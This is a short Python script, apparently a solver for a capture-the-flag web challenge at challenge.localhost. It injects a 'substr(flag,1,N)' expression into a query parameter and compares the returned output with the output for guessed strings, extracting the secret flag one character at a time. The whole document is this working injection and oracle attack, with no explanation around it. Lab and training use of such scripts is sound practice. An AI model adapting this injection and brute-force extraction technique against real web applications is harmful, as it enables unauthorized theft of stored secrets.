#!/usr/bin/python3

import requests
import string
import base64
def sender(data):
    payload = f"substr(flag,1,{data})"
    d = requests.get(f"http://challenge.localhost/?query={payload}")
    return d.text.split('pre>')[3][:-2]
#sender(1)
def cracker(data):
    d = requests.get(f"http://challenge.localhost/?query='{data}'")
    #print(d.text)
    return d.text.split('pre>')[3][:-2]
#cracker('p')

flag = ""

for i in range(61):
    cipher_block = sender(i)
    for c in"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~`1234567890-_=+{[]}\|;:,<.>/?!@":
        flag += c
        block = cracker(flag)
        if cipher_block == block:
            print(flag)
            break
        flag = flag[:-1]
print("\033[38;5;80mYour decrepted Flag: \033[38;5;194m"+flag)
